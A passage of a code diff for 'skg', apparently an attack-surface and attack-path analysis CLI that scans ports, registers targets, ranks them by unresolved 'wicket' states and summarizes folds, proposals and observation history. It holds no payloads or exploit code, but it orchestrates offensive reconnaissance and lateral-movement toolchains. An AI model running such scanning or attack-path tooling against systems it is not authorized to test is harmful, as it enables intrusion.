@@ -48,14 +48,21 @@ TOOLCHAINS (direct):
   skg catalog compile [options]
 """
 
-import json, sys, os, argparse, subprocess, urllib.request, urllib.error, glob
+import json, sys, os, argparse, subprocess, urllib.request, urllib.error, glob, importlib.util, shutil, tempfile
 from pathlib import Path
+from urllib.parse import urlparse
+from datetime import datetime, timezone
+
+REPO_ROOT = Path(__file__).resolve().parents[1]
+if str(REPO_ROOT) not in sys.path:
+    sys.path.insert(0, str(REPO_ROOT))
+
+from skg.core.paths import (
+    SKG_HOME, SKG_STATE_DIR, DISCOVERY_DIR, CVE_DIR, SKG_CONFIG_DIR,
+    EVENTS_DIR, INTERP_DIR, IDENTITY_FILE,
+)
 
 API      = "http://127.0.0.1:5055"
-SKG_HOME = Path("/opt/skg")
-DISCOVERY_DIR = Path("/var/lib/skg/discovery")
-SKG_STATE_DIR = Path("/var/lib/skg")
-CVE_DIR  = Path("/var/lib/skg/cve")
 
 
 # ── Helpers ──────────────────────────────────────────────────────────────
@@ -107,7 +114,8 @@ def _lateral(*args): return _tc("skg-ad-lateral-toolchain",       "skg_lateral.p
 
 
 def _resonance_engine():
-    sys.path.insert(0, str(SKG_HOME))
+    if str(REPO_ROOT) not in sys.path:
+        sys.path.insert(0, str(REPO_ROOT))
     from skg.resonance.engine import ResonanceEngine
     from skg.core.paths import RESONANCE_DIR
     engine = ResonanceEngine(RESONANCE_DIR)
@@ -116,10 +124,246 @@ def _resonance_engine():
 
 
 def _latest_surface() -> str:
-    """Find the latest surface JSON by modification time."""
-    surfaces = sorted(glob.glob(str(DISCOVERY_DIR / "surface_*.json")),
-                      key=os.path.getmtime)
-    return surfaces[-1] if surfaces else ""
+    """Find the best current surface JSON, preferring richer observed target sets."""
+    surfaces = glob.glob(str(DISCOVERY_DIR / "surface_*.json"))
+    if not surfaces:
+        return ""
+
+    def _score(path: str) -> tuple[int, int, float]:
+        try:
+            data = json.loads(Path(path).read_text())
+            targets = data.get("targets", []) or []
+            target_count = sum(1 for t in targets if t.get("ip") or t.get("host"))
+            service_count = sum(len(t.get("services", []) or []) for t in targets)
+            return (target_count + service_count, target_count, os.path.getmtime(path))
+        except Exception:
+            return (0, 0, os.path.getmtime(path))
+
+    return max(surfaces, key=_score)
+
+
+def _iso_now() -> str:
+    return datetime.now(timezone.utc).isoformat()
+
+
+def _load_surface_data() -> tuple[dict, str]:
+    surface_path = _latest_surface()
+    if surface_path:
+        try:
+            surface = json.loads(Path(surface_path).read_text())
+            _ensure_local_runtime_targets(surface)
+            return surface, surface_path
+        except Exception:
+            pass
+    surface = {"meta": {"generated_at": _iso_now()}, "targets": []}
+    _ensure_local_runtime_targets(surface)
+    return surface, surface_path
+
+
+def _write_surface_data(surface: dict, surface_path: str = "") -> str:
+    _ensure_local_runtime_targets(surface)
+    target_path = Path(surface_path) if surface_path else (DISCOVERY_DIR / f"surface_{os.urandom(4).hex()}.json")
+    meta = surface.setdefault("meta", {})
+    meta["generated_at"] = _iso_now()
+    meta["targets_classified"] = len(surface.get("targets", []))
+    target_path.write_text(json.dumps(surface, indent=2))
+    return str(target_path)
+
+
+def _ensure_local_runtime_targets(surface: dict) -> None:
+    """Inject configured local runtime endpoints as observable targets."""
+    try:
+        import yaml
+        from urllib.parse import urlparse
+
+        cfg_path = SKG_HOME / "config" / "skg_config.yaml"
+        cfg = yaml.safe_load(cfg_path.read_text()) or {}
+        resonance = cfg.get("resonance", {}) or {}
+        ollama = resonance.get("ollama", {}) or {}
+        url = str(ollama.get("url") or "").strip()
+        if not url:
+            return
+        parsed = urlparse(url)
+        host = (parsed.hostname or "").strip().lower()
+        if host not in {"127.0.0.1", "localhost"}:
+            return
+        ip = "127.0.0.1"
+        port = int(parsed.port or 11434)
+        model = str(ollama.get("model") or "").strip()
+        banner = "Ollama API" + (f" ({model})" if model else "")
+        svc = {"port": port, "service": "ollama", "banner": banner}
+
+        targets = surface.setdefault("targets", [])
+        existing = next((t for t in targets if (t.get("ip") or t.get("host")) == ip), None)
+        if existing is None:
+            targets.append({
+                "ip": ip,
+                "host": ip,
+                "hostname": "localhost",
+                "os": "local",
+                "kind": "local-ai-service",
+                "services": [svc],
+                "domains": ["ai_target", "web"],
+                "applicable_attack_paths": [],
+            })
+            return
+
+        existing["host"] = existing.get("host") or ip
+        existing["ip"] = existing.get("ip") or ip
+        existing["hostname"] = existing.get("hostname") or "localhost"
+        existing["os"] = existing.get("os") or "local"
+        existing["kind"] = existing.get("kind") or "local-ai-service"
+        services = existing.setdefault("services", [])
+        if not any(int(s.get("port", 0) or 0) == port for s in services):
+            services.append(svc)
+        domains = set(existing.get("domains", []) or [])
+        domains.update({"ai_target", "web"})
+        existing["domains"] = sorted(domains)
+    except Exception:
+        return
+
+
+def _surface_target(ip: str) -> dict | None:
+    surface, _ = _load_surface_data()
+    for target in surface.get("targets", []):
+        if target.get("ip") == ip:
+            return target
+    return None
+
+
+def _interp_payload(rec: dict) -> dict:
+    if isinstance(rec, dict) and isinstance(rec.get("payload"), dict):
+        return rec["payload"]
+    return rec if isinstance(rec, dict) else {}
+
+
+def _projection_rank(payload: dict) -> tuple[int, float]:
+    cls = payload.get("classification", "")
+    score = payload.get("aprs", payload.get("lateral_score",
+            payload.get("escape_score", payload.get("host_score",
+            payload.get("web_score", payload.get("ai_score", 0.0))))))
+    if cls == "realized":
+        return (3, float(score))
+    if cls == "not_realized":
+        return (2, float(score))
+    if cls == "indeterminate":
+        return (1, float(score))
+    return (0, float(score))
+
+
+def _load_module_from_file(module_name: str, file_path: Path):
+    spec = importlib.util.spec_from_file_location(module_name, file_path)
+    if spec is None or spec.loader is None:
+        raise ImportError(f"cannot load module from {file_path}")
+    module = importlib.util.module_from_spec(spec)
+    spec.loader.exec_module(module)
+    return module
+
+
+def _register_target(ip: str, domain: str | None = None) -> str:
+    surface, surface_path = _load_surface_data()
+    targets = surface.setdefault("targets", [])
+    existing = next((t for t in targets if t.get("ip") == ip), None)
+    if existing is None:
+        existing = {
+            "ip": ip,
+            "os": "unknown",
+            "kind": "unknown",
+            "services": [],
+            "domains": [],
+            "applicable_attack_paths": [],
+        }
+        targets.append(existing)
+    if domain and domain not in existing.setdefault("domains", []):
+        existing["domains"].append(domain)
+        existing["domains"] = sorted(set(existing["domains"]))
+    _persist_target_config(ip, domain)
+    return _write_surface_data(surface, surface_path)
+
+
+def _merge_target_into_surface(target: dict) -> str:
+    surface, surface_path = _load_surface_data()
+    targets = surface.setdefault("targets", [])
+    existing = next((t for t in targets if t.get("ip") == target.get("ip")), None)
+    if existing is None:
+        targets.append(target)
+    else:
+        existing.update(target)
+    return _write_surface_data(surface, surface_path)
+
+
+def _register_web_observation_target(target_url: str, events_file: Path | None = None) -> str:
+    parsed = urlparse(target_url)
+    host = parsed.hostname or target_url
+    scheme = parsed.scheme or "https"
+    port = parsed.port or (443 if scheme == "https" else 80)
+    service = "https" if scheme == "https" else "http"
+    discovery = _load_module_from_file("skg_discovery_cli_runtime", SKG_HOME / "skg-discovery" / "discovery.py")
+    classified = discovery.classify_target(
+        host,
+        [(port, service, host)],
+        os_guess="external-web",
+        is_container=False,
+    )
+    load_states = getattr(discovery, "_load_latest_wicket_states_for_ip")
+    try:
+        wicket_states = load_states(host, DISCOVERY_DIR)
+    except Exception:
+        wicket_states = {}
+    classified["wicket_states"] = wicket_states
+    classified["source_url"] = target_url
+    classified["kind"] = classified.get("kind") or "external-web"
+    if "web" not in classified.get("domains", []):
+        classified["domains"] = sorted(set(classified.get("domains", []) + ["web"]))
+    return _merge_target_into_surface(classified)
+
+
+def _persist_target_config(ip: str, domain: str | None = None) -> None:
+    targets_file = Path("/etc/skg/targets.yaml")
+    if not targets_file.exists():
+        return
+    try:
+        import yaml
+        data = yaml.safe_load(targets_file.read_text()) or {}
+        targets = data.setdefault("targets", [])
+        existing = next((t for t in targets if t.get("host") == ip), None)
+        if existing is None:
+            entry = {"host": ip, "enabled": True}
+            if domain:
+                entry["domain"] = domain
+            targets.append(entry)
+            targets_file.write_text(yaml.safe_dump(data, sort_keys=False))
+    except Exception:
+        pass
+
+
+def _load_target_config(ip: str) -> dict | None:
+    targets_file = Path("/etc/skg/targets.yaml")
+    if not targets_file.exists():
+        return None
+    try:
+        import yaml
+        data = yaml.safe_load(targets_file.read_text()) or {}
+        for target in data.get("targets", []):
+            if target.get("host") == ip or target.get("workload_id", "").endswith(ip):
+                return target
+    except Exception:
+        return None
+    return None
+
+
+def _bootstrap_target_surface(ip: str) -> str:
+    discovery_module = _load_module_from_file(
+        "skg_discovery_bootstrap",
+        SKG_HOME / "skg-discovery" / "discovery.py",
+    )
+    services = discovery_module.scan_ports(ip)
+    target = discovery_module.classify_target(ip, services, os_guess="unknown", is_container=ip.startswith(("172.17.", "172.18.")))
+    surface, surface_path = _load_surface_data()
+    targets = [t for t in surface.get("targets", []) if t.get("ip") != ip]
+    targets.append(target)
+    surface["targets"] = sorted(targets, key=lambda t: t.get("ip", ""))
+    return _write_surface_data(surface, surface_path)
 
 
 def _run_python(script_path, *args, env_extra=None):
@@ -187,31 +431,691 @@ def cmd_status(a):
         surface = json.loads(Path(surface_path).read_text())
         meta = surface.get("meta", {})
         targets = surface.get("targets", [])
+        fold_rows = _choose_fold_rows(_api("GET", "/folds") or {})
+        backlog = _proposal_backlog()
 
         print(f"  Surface: {Path(surface_path).name}")
         print(f"    Hosts: {meta.get('hosts_found', '?')}")
         print(f"    Targets: {meta.get('targets_classified', '?')}")
         print(f"    Docker: {meta.get('docker_containers', '?')}")
+        gravity_state = (d or {}).get("gravity_state", {}) if isinstance(d, dict) else {}
+        if gravity_state:
+            print(f"    Gravity: cycle={gravity_state.get('cycle', '?')} "
+                  f"E={gravity_state.get('total_entropy', '?')} "
+                  f"Unresolved={gravity_state.get('total_unknowns', '?')} "
+                  f"Field+={gravity_state.get('field_pull_boost', '?')}")
+        print()
+
+        _print_what_matters_now(surface, fold_rows, backlog)
         print()
 
         # Compute entropy landscape
         print(f"  Entropy Landscape:")
-        print(f"  {'IP':18s} {'E':>6s} {'Unk':>5s} {'Real':>5s} {'Blk':>5s}  Domains")
-        print(f"  {'-'*18} {'-'*6} {'-'*5} {'-'*5} {'-'*5}  {'-'*20}")
+        print(f"  {'IP':18s} {'E':>6s} {'Base':>6s} {'Field+':>7s} {'Real':>5s} {'Blk':>5s} {'Comp':>6s} {'Decoh':>7s}  Domains")
+        print(f"  {'-'*18} {'-'*6} {'-'*6} {'-'*7} {'-'*5} {'-'*5} {'-'*6} {'-'*7}  {'-'*20}")
+
+        field_map = {}
+        persistence_map = {}
+        fiber_clusters = {}
+        anchored_field_pull = None
+        try:
+            field = _api("GET", "/topology/field") or {}
+            for sphere, row in (field.get("spheres") or {}).items():
+                field_map[sphere] = float((row or {}).get("gravity_pull", 0.0) or 0.0)
+                persistence_map[sphere] = float((row or {}).get("pearl_persistence", 0.0) or 0.0)
+        except Exception:
+            field_map = {}
+        if not field_map:
+            try:
+                from skg.topology.energy import anchored_field_pull, compute_field_fibers, compute_field_topology
+                field = compute_field_topology(DISCOVERY_DIR, SKG_STATE_DIR / "interp").as_dict()
+                for sphere, row in (field.get("spheres") or {}).items():
+                    field_map[sphere] = float((row or {}).get("gravity_pull", 0.0) or 0.0)
+                    persistence_map[sphere] = float((row or {}).get("pearl_persistence", 0.0) or 0.0)
+                fiber_clusters = {c.anchor: c for c in compute_field_fibers()}
+            except Exception:
+                field_map = {}
+                persistence_map = {}
+                fiber_clusters = {}
+        else:
+            try:
+                from skg.topology.energy import anchored_field_pull, compute_field_fibers
+                fiber_clusters = {c.anchor: c for c in compute_field_fibers()}
+            except Exception:
+                fiber_clusters = {}
 
         for t in targets:
             ip = t["ip"]
-            ws = t.get("wicket_states", {})
-            unknown = sum(1 for v in ws.values() if v == "unknown" or (isinstance(v, dict) and v.get("status") == "unknown"))
-            realized = sum(1 for v in ws.values() if v == "realized" or (isinstance(v, dict) and v.get("status") == "realized"))
-            blocked = sum(1 for v in ws.values() if v == "blocked" or (isinstance(v, dict) and v.get("status") == "blocked"))
-            domains = ", ".join(t.get("domains", []))
-            E = unknown  # Field energy = unknowns
+            counts = _target_state_counts(t)
+            unknown = counts["unknown"]
+            realized = counts["realized"]
+            blocked = counts["blocked"]
+            compatibility = counts["compatibility_score_mean"]
+            decoherence = counts["decoherence_total"]
+            target_domains = list(t.get("domains", []))
+            domains = ", ".join(target_domains)
+            field_pull = round(
+                anchored_field_pull(ip, target_domains, field_map, fiber_clusters, sphere_persistence=persistence_map)
+                if anchored_field_pull is not None else 0.0,
+                3,
+            )
+            E = unknown + field_pull
             if E > 0 or realized > 0 or blocked > 0:
-                print(f"  {ip:18s} {E:6.0f} {unknown:5d} {realized:5d} {blocked:5d}  {domains}")
+                print(f"  {ip:18s} {E:6.1f} {unknown:6d} {field_pull:7.3f} {realized:5d} {blocked:5d} {compatibility:6.3f} {decoherence:7.3f}  {domains}")
         print()
     else:
         print("  No surface data. Run: skg target add-subnet <cidr>")
+
+    if getattr(a, "self_audit", False):
+        print()
+        _print_substrate_self_audit()
+
+
+def _proposal_backlog() -> dict:
+    proposals_dir = SKG_STATE_DIR / "proposals"
+    counts = {
+        "pending_total": 0,
+        "pending_toolchain_generation": 0,
+        "pending_catalog_growth": 0,
+        "pending_field_action": 0,
+        "error_total": 0,
+    }
+    if not proposals_dir.exists():
+        return counts
+
+    for proposal_file in proposals_dir.glob("*.json"):
+        try:
+            proposal = json.loads(proposal_file.read_text())
+        except Exception:
+            continue
+        status = proposal.get("status", "")
+        kind = proposal.get("proposal_kind", "")
+        if status == "pending":
+            counts["pending_total"] += 1
+            if kind == "toolchain_generation":
+                counts["pending_toolchain_generation"] += 1
+            elif kind == "catalog_growth":
+                counts["pending_catalog_growth"] += 1
+            elif kind == "field_action":
+                counts["pending_field_action"] += 1
+        if str(status).startswith("error"):
+            counts["error_total"] += 1
+    return counts
+
+
+def _fold_summary_offline() -> dict:
+    folds_dir = DISCOVERY_DIR / "folds"
+    total = 0
+    by_type = {}
+    total_weight = 0.0
+    if not folds_dir.exists():
+        return {"total": 0, "by_type": {}, "total_gravity_weight": 0.0}
+
+    for fold_file in folds_dir.glob("folds_*.json"):
+        try:
+            folds = json.loads(fold_file.read_text())
+        except Exception:
+            continue
+        for fold in folds:
+            total += 1
+            fold_type = fold.get("fold_type", "unknown")
+            by_type[fold_type] = by_type.get(fold_type, 0) + 1
+            try:
+                total_weight += float(fold.get("gravity_weight", 0.0))
+            except Exception:
+                pass
+    return {
+        "total": total,
+        "by_type": by_type,
+        "total_gravity_weight": round(total_weight, 4),
+    }
+
+
+def _choose_fold_summary(api_folds: dict | None) -> dict:
+    offline = _fold_summary_offline()
+    online = (api_folds or {}).get("summary") or {}
+    if offline.get("total", 0) >= online.get("total", 0):
+        return offline
+    return online
+
+
+def _load_folds_offline() -> list[dict]:
+    folds_dir = DISCOVERY_DIR / "folds"
+    rows = []
+    if not folds_dir.exists():
+        return rows
+    for fold_file in folds_dir.glob("folds_*.json"):
+        try:
+            rows.extend(json.loads(fold_file.read_text()))
+        except Exception:
+            continue
+    return rows
+
+
+def _choose_fold_rows(api_folds: dict | None) -> list[dict]:
+    offline = _load_folds_offline()
+    online = (api_folds or {}).get("folds") or []
+    if len(offline) >= len(online):
+        return offline
+    return online
+
+
+def _target_state_counts(target: dict) -> dict:
+    ws = target.get("wicket_states", {})
+    unknown = sum(1 for v in ws.values() if v == "unknown" or (isinstance(v, dict) and v.get("status") == "unknown"))
+    realized = sum(1 for v in ws.values() if v == "realized" or (isinstance(v, dict) and v.get("status") == "realized"))
+    blocked = sum(1 for v in ws.values() if v == "blocked" or (isinstance(v, dict) and v.get("status") == "blocked"))
+    unresolved_rows = [v for v in ws.values() if isinstance(v, dict) and v.get("status") == "unknown"]
+    unresolved_reasons = {}
+    compatibility_values = []
+    decoherence_values = []
+    for row in unresolved_rows:
+        reason = str(row.get("unresolved_reason") or "unmeasured")
+        unresolved_reasons[reason] = unresolved_reasons.get(reason, 0) + 1
+        compatibility_values.append(float(row.get("compatibility_score", 0.0) or 0.0))
+        decoherence_values.append(float(row.get("decoherence", 0.0) or 0.0))
+    return {
+        "unknown": unknown,
+        "realized": realized,
+        "blocked": blocked,
+        "unresolved_reasons": unresolved_reasons,
+        "compatibility_score_mean": round(sum(compatibility_values) / len(compatibility_values), 3) if compatibility_values else 0.0,
+        "decoherence_total": round(sum(decoherence_values), 3),
+    }
+
+
+def _rank_surface_targets(surface: dict, folds: list[dict] | None = None) -> list[dict]:
+    fold_weight_by_ip = {}
+    fold_count_by_ip = {}
+    for fold in folds or []:
+        ip = fold.get("target_ip") or fold.get("location", "").split("::")[-1]
+        if not ip:
+            continue
+        fold_count_by_ip[ip] = fold_count_by_ip.get(ip, 0) + 1
+        try:
+            fold_weight_by_ip[ip] = fold_weight_by_ip.get(ip, 0.0) + float(fold.get("gravity_weight", 0.0))
+        except Exception:
+            pass
+
+    ranked = []
+    for target in surface.get("targets", []):
+        counts = _target_state_counts(target)
+        ip = target.get("ip", "")
+        ranked.append({
+            "ip": ip,
+            "kind": target.get("kind") or target.get("os") or "?",
+            "domains": target.get("domains", []),
+            "services": target.get("services", []),
+            "unknown": counts["unknown"],
+            "realized": counts["realized"],
+            "blocked": counts["blocked"],
+            "unresolved_reasons": counts["unresolved_reasons"],
+            "compatibility_score_mean": counts["compatibility_score_mean"],
+            "decoherence_total": counts["decoherence_total"],
+            "folds": fold_count_by_ip.get(ip, 0),
+            "fold_weight": round(fold_weight_by_ip.get(ip, 0.0), 2),
+            "priority": counts["unknown"] + fold_weight_by_ip.get(ip, 0.0),
+        })
+    ranked.sort(key=lambda row: (row["priority"], row["unknown"], row["realized"]), reverse=True)
+    return ranked
+
+
+def _print_what_matters_now(surface: dict, fold_rows: list[dict], backlog: dict) -> None:
+    ranked = _rank_surface_targets(surface, fold_rows)
+    focus = [row for row in ranked if row["priority"] > 0][:5]
+    print("  What Matters Now:")
+    if not focus:
+        print("    no active targets with unresolved structure")
+    else:
+        for row in focus:
+            services = ", ".join(f"{s.get('port')}/{s.get('service')}" for s in row["services"][:6]) or "none"
+            domains = ", ".join(row["domains"]) or "none"
+            fold_note = f", folds={row['folds']} (+{row['fold_weight']:.1f})" if row["folds"] else ""
+            print(f"    {row['ip']:18s} [{row['kind']}] E≈{row['priority']:.1f} unk={row['unknown']}{fold_note}")
+            reasons = row.get("unresolved_reasons", {}) or {}
+            if reasons:
+                reason_text = ", ".join(f"{k}={v}" for k, v in sorted(reasons.items())[:4])
+                print(f"      unresolved: {reason_text}")
+            print(f"      measurement: compatibility={float(row.get('compatibility_score_mean', 0.0)):.3f} decoherence={float(row.get('decoherence_total', 0.0)):.3f}")
+            print(f"      services: {services}")
+            print(f"      domains : {domains}")
+    print(f"    proposals: pending={backlog['pending_total']} toolchains={backlog['pending_toolchain_generation']} growth={backlog['pending_catalog_growth']} actions={backlog['pending_field_action']} errors={backlog['error_total']}")
+
+
+def _load_recall_summary(target_filter: str | None = None, limit: int = 8) -> dict:
+    records_path = SKG_STATE_DIR / "resonance" / "records" / "observations.jsonl"
+    pending_path = SKG_STATE_DIR / "resonance" / "records" / "observations_pending.jsonl"
+
+    records = []
+    pending = 0
+
+    def _matches(rec: dict) -> bool:
+        if not target_filter:
+            return True
+        wid = str(rec.get("workload_id", ""))
+        cond = str(rec.get("wicket_id", ""))
+        evidence = str(rec.get("evidence_text", ""))
+        return target_filter in wid or target_filter in cond or target_filter in evidence
+
+    if pending_path.exists():
+        for line in pending_path.read_text(errors="replace").splitlines():
+            if not line.strip():
+                continue
+            try:
+                rec = json.loads(line)
+            except Exception:
+                continue
+            if _matches(rec):
+                pending += 1
+
+    if records_path.exists():
+        for line in records_path.read_text(errors="replace").splitlines():
+            if not line.strip():
+                continue
+            try:
+                rec = json.loads(line)
+            except Exception:
+                continue
+            if _matches(rec):
+                records.append(rec)
+
+    confirmed = [r for r in records if r.get("projection_confirmed") is not None]
+    realized = [r for r in confirmed if r.get("projection_confirmed") == "realized"]
+
+    by_domain = {}
+    for rec in confirmed:
+        dom = rec.get("domain") or "unknown"
+        stats = by_domain.setdefault(dom, {"confirmed": 0, "realized": 0})
+        stats["confirmed"] += 1
+        if rec.get("projection_confirmed") == "realized":
+            stats["realized"] += 1
+
+    domain_rates = []
+    for dom, stats in by_domain.items():
+        domain_rates.append({
+            "domain": dom,
+            "confirmed": stats["confirmed"],
+            "realized": stats["realized"],
+            "confirmation_rate": round(stats["realized"] / stats["confirmed"], 3) if stats["confirmed"] else None,
+        })
+    domain_rates.sort(key=lambda x: (x["confirmed"], x["realized"]), reverse=True)
+
+    recent = sorted(confirmed, key=lambda r: r.get("ts", ""), reverse=True)[:limit]
+    recent_view = [{
+        "ts": rec.get("ts"),
+        "workload_id": rec.get("workload_id"),
+        "wicket_id": rec.get("wicket_id"),
+        "domain": rec.get("domain"),
+        "source_kind": rec.get("source_kind"),
+        "projection_confirmed": rec.get("projection_confirmed"),
+        "confidence_at_emit": rec.get("confidence_at_emit"),
+        "evidence_text": (rec.get("evidence_text", "") or "")[:120],
+    } for rec in recent]
+
+    return {
+        "count": len(records),
+        "pending": pending,
+        "confirmed": len(confirmed),
+        "realized": len(realized),
+        "confirmation_rate": round(len(realized) / len(confirmed), 3) if confirmed else None,
+        "by_domain": domain_rates[:6],
+        "recent": recent_view,
+    }
+
+
+def _pearl_brief(pearl: dict) -> str:
+    state_changes = pearl.get("state_changes", []) or []
+    reason_changes = pearl.get("reason_changes", []) or []
+    projection_changes = pearl.get("projection_changes", []) or []
+    target_snapshot = pearl.get("target_snapshot", {}) or {}
+    fold_context = pearl.get("fold_context", []) or []
+
+    if state_changes:
+        first = state_changes[0]
+        wid = first.get("wicket_id") or first.get("node_id") or "?"
+        from_state = first.get("from") or first.get("from_state", "?")
+        to_state = first.get("to") or first.get("to_state", "?")
+        count = len(state_changes)
+        return f"{wid} {from_state}->{to_state}" + (f" (+{count-1} more)" if count > 1 else "")
+    if projection_changes:
+        first = projection_changes[0]
+        if first.get("kind") == "domain_shift":
+            added = ", ".join(first.get("added", [])[:4]) or "none"
+            removed = ", ".join(first.get("removed", [])[:4]) or "none"
+            return f"domains +{added} -{removed}"
+        if first.get("kind") == "service_shift":
+            added = ", ".join(first.get("added", [])[:4]) or "none"
+            return f"services +{added}"
+        ap = first.get("attack_path_id", "?")
+        cls = first.get("classification", "?")
+        return f"{ap} => {cls}"
+    if target_snapshot:
+        props = _active_identity_properties(target_snapshot)
+        if props:
+            return f"identity {', '.join(props[:4])}"
+    if fold_context:
+        fold = fold_context[0]
+        detail = fold.get("detail", "") or ""
+        return detail[:72]
+    if reason_changes:
+        first = reason_changes[0]
+        inst = first.get("instrument") or "instrument"
+        success = "ok" if first.get("success") else "note"
+        why = first.get("reason") or first.get("detail") or f"{inst} {success}"
+        return str(why)[:72]
+    return "state remembered"
+
+
+def _active_identity_properties(snapshot: dict) -> list[str]:
+    props = (snapshot or {}).get("identity_properties", {}) or {}
+    return [k for k, v in props.items() if v is True]
+
+
+def _fold_brief_why(fold: dict) -> str:
+    why = fold.get("why", {}) or {}
+    mismatch = why.get("mismatch")
+    if mismatch == "observed_vulnerability_without_mapping":
+        cve = why.get("cve_id", "?")
+        svc = why.get("service", "?")
+        return f"{cve} is observed on {svc}, but SKG has no wicket mapping"
+    if mismatch in {"observed_service_implies_missing_toolchain", "observed_service_without_toolchain"}:
+        svc = why.get("service", "?")
+        return f"{svc} is observed, but SKG has no toolchain coverage for it"
+    if mismatch == "observed_surface_implies_missing_path":
+        ap = why.get("attack_path_id", "?")
+        svc = why.get("service", "?")
+        return f"{svc} suggests attack path {ap}, but SKG cannot yet express it"
+    if mismatch == "recent_observation_implies_missing_path":
+        ap = why.get("attack_path_id", "?")
+        return f"recent observation suggests {ap}, but current structure is incomplete"
+    if mismatch == "stale_realized_evidence":
+        wid = why.get("wicket_id", "?")
+        return f"{wid} was previously realized, but its evidence is now stale"
+    detail = fold.get("detail", "") or ""
+    return detail[:120]
+
+
+def _describe_next_collapse(target: dict, folds: list[dict], proposals: list[dict]) -> str:
+    pending = [p for p in proposals if p.get("status") == "pending"]
+    if pending:
+        first = pending[0]
+        desc = first.get("description", "")[:110]
+        if first.get("proposal_kind") == "toolchain_generation":
+            return f"operator review of toolchain growth: {desc}"
+        return f"operator review/action: {desc}"
+    for fold in folds:
+        for step in (fold.get("discriminators", []) or [])[:2]:
+            if step:
+                return step
+    services = target.get("services", []) or []
+    ports = {svc.get("port") for svc in services}
+    names = {(svc.get("service") or "").lower() for svc in services}
+    if any(p in {80, 443, 8080, 8443, 8008, 8009} for p in ports) or any(n in {"http", "https"} for n in names):
+        return "collect deeper web evidence to collapse remaining WB-* uncertainty"
+    if any(p in {22} for p in ports) or "host" in set(target.get("domains", []) or []):
+        return "collect deeper host evidence to collapse remaining HO/FI/PI/LI uncertainty"
+    if any(p in {3306, 5432, 6379, 27017} for p in ports) or "data_pipeline" in set(target.get("domains", []) or []):
+        return "collect deeper data evidence to collapse remaining DP-* uncertainty"
+    return "follow the highest-energy unresolved fold"
+
+
+def _pearl_signature(pearl: dict) -> tuple:
+    target_snapshot = pearl.get("target_snapshot", {}) or {}
+    fold_context = pearl.get("fold_context", []) or []
+    state_changes = pearl.get("state_changes", []) or []
+    projection_changes = pearl.get("projection_changes", []) or []
+
+    identity = tuple(sorted(_active_identity_properties(target_snapshot)[:6]))
+    domains = tuple(sorted((target_snapshot.get("domains", []) or [])[:6]))
+    services = tuple(
+        sorted(
+            f"{svc.get('port')}/{svc.get('service')}"
+            for svc in (target_snapshot.get("services", []) or [])[:6]
+        )
+    )
+    top_fold = ""
+    if fold_context:
+        top_fold = str((fold_context[0].get("why", {}) or {}).get("mismatch") or fold_context[0].get("fold_type") or "")
+    state_shape = tuple(
+        sorted(
+            f"{change.get('wicket_id','?')}:{change.get('to') or change.get('to_state') or '?'}"
+            for change in state_changes[:4]
+        )
+    )
+    projection_shape = tuple(
+        sorted(
+            f"{change.get('kind','?')}:{','.join(change.get('added', [])[:4])}"
+            for change in projection_changes[:4]
+        )
+    )
+    return (identity, domains, services, top_fold, state_shape, projection_shape)
+
+
+def _summarize_pearl_cluster(cluster: list[dict]) -> str:
+    if not cluster:
+        return ""
+    first = cluster[-1]
+    count = len(cluster)
+    target_snapshot = first.get("target_snapshot", {}) or {}
+    fold_context = first.get("fold_context", []) or []
+    projection_changes = first.get("projection_changes", []) or []
+    state_changes = first.get("state_changes", []) or []
+
+    if state_changes:
+        return _pearl_brief(first) + (f" x{count}" if count > 1 else "")
+    if projection_changes:
+        return _pearl_brief(first) + (f" x{count}" if count > 1 else "")
+    if fold_context:
+        return _fold_brief_why(fold_context[0])[:96] + (f" x{count}" if count > 1 else "")
+    if target_snapshot:
+        props = _active_identity_properties(target_snapshot)
+        if props:
+            return f"identity stabilized around {', '.join(props[:4])}" + (f" x{count}" if count > 1 else "")
+    return _pearl_brief(first) + (f" x{count}" if count > 1 else "")
+
+
+def _cluster_pearls(pearls: list[dict], limit: int = 5) -> list[dict]:
+    clusters = []
+    current = []
+    current_sig = None
+    for pearl in pearls:
+        sig = _pearl_signature(pearl)
+        if current and sig != current_sig:
+            clusters.append({
+                "count": len(current),
+                "start_ts": current[0].get("timestamp"),
+                "end_ts": current[-1].get("timestamp"),
+                "summary": _summarize_pearl_cluster(current),
+            })
+            current = []
+        current.append(pearl)
+        current_sig = sig
+    if current:
+        clusters.append({
+            "count": len(current),
+            "start_ts": current[0].get("timestamp"),
+            "end_ts": current[-1].get("timestamp"),
+            "summary": _summarize_pearl_cluster(current),
+        })
+    return clusters[-limit:]
+
+
+def _parse_report_timestamp(raw: str | None):
+    if not raw:
+        return None
+    try:
+        from datetime import datetime, timezone
+        ts = datetime.fromisoformat(str(raw).replace("Z", "+00:00"))
+        if ts.tzinfo is None:
+            ts = ts.replace(tzinfo=timezone.utc)
+        return ts
+    except Exception:
+        return None
+
+
+def _load_target_snapshot_from_pearls(target_filter: str, at_ts=None) -> dict | None:
+    pearls_path = SKG_STATE_DIR / "pearls.jsonl"
+    if not pearls_path.exists() or not target_filter:
+        return None
+    chosen = None
+    chosen_ts = None
+    for line in pearls_path.read_text(errors="replace").splitlines():
+        if not line.strip():
+            continue
+        try:
+            pearl = json.loads(line)
+        except Exception:
+            continue
+        snap = pearl.get("target_snapshot", {}) or {}
+        target_ip = snap.get("ip") or pearl.get("energy_snapshot", {}).get("target_ip")
+        if target_ip != target_filter:
+            continue
+        ts = _parse_report_timestamp(pearl.get("timestamp"))
+        if at_ts and (ts is None or ts > at_ts):
+            continue
+        if chosen_ts is None or (ts and ts > chosen_ts):
+            chosen = pearl
+            chosen_ts = ts
+    return chosen
+
+
+def _diff_target_snapshots(before: dict, after: dict) -> dict:
+    if not before or not after:
+        return {}
+    before_services = {(svc.get("port"), svc.get("service")) for svc in before.get("services", [])}
+    after_services = {(svc.get("port"), svc.get("service")) for svc in after.get("services", [])}
+    before_domains = set(before.get("domains", []) or [])
+    after_domains = set(after.get("domains", []) or [])
+    before_props = before.get("identity_properties", {}) or {}
+    after_props = after.get("identity_properties", {}) or {}
+    prop_changes = []
+    for key in sorted(set(before_props) | set(after_props)):
+        if before_props.get(key) != after_props.get(key):
+            prop_changes.append({
+                "property": key,
+                "before": before_props.get(key),
+                "after": after_props.get(key),
+            })
+    return {
+        "domains_added": sorted(after_domains - before_domains),
+        "domains_removed": sorted(before_domains - after_domains),
+        "services_added": [f"{p}/{s}" for p, s in sorted(after_services - before_services)],
+        "services_removed": [f"{p}/{s}" for p, s in sorted(before_services - after_services)],
+        "property_changes": prop_changes,
+    }
+
+
+def _infer_identity_properties_from_target(target: dict) -> dict:
